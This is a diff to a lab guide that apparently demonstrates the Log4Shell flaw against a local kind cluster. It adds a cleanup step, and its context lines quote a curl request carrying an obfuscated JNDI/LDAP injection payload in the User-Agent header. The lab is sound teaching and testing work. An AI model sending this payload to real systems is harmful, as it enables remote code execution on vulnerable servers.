@@ -43,3 +43,7 @@ Running `curl -v -H 'Host: example.com' -H 'User-Agent: ${${lower:j}ndi:ldap://1
 
 Running `curl -v -H 'Host: example.com' http://localhost:8000` will return a 200 with
 some information about the request as expected, since you're not trying to exploit anything
+
+## Cleaning Up
+
+When you're done, you can run `kind delete cluster` and the cluster we created will be turned off.
